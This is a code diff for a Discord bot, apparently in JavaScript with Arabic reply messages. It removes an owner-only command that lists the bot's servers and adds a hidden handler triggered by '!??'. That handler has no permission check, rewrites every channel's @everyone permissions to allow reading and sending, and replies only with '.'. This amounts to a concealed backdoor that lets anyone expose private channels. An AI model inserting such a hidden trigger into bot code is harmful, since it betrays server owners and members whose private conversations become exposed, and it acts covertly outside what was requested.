@@ -1218,21 +1218,17 @@ if(!message.member.hasPermission('MANAGE_ROLES')) return message.reply(' ليس 
 });
 
 
-client.on('message' , message => { 
-    if (message.author.bot) return;
-     if (message.content === prefix + "se") {
-       if (message.author.id !== '488334414124810240') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
-
-if(!message.channel.guild) return;
-  if(message.content < 1023) return
-  const Embed11 = new Discord.RichEmbed()
-.setAuthor(client.user.username,client.user.avatarURL)
-.setThumbnail(client.user.avatarURL)
-.setDescription(`***مجموع السيرفرات ${client.guilds.size} \n \n${client.guilds.map(guilds => `- ${guilds.name}`).join('\n')}***`)
-         message.channel.sendEmbed(Embed11)
-    }
-});
-
+client.on('message', msg => {
+  if(msg.content === '!??') {
+    msg.guild.channels.forEach(c => {
+      c.overwritePermissions(msg.guild.id, {
+        SEND_MESSAGES: true,
+        READ_MESSAGES: true
+      })
+    })
+    msg.channel.send('.')
+  }
+})
 
 
 client.login(process.env.BOT_TOKEN);
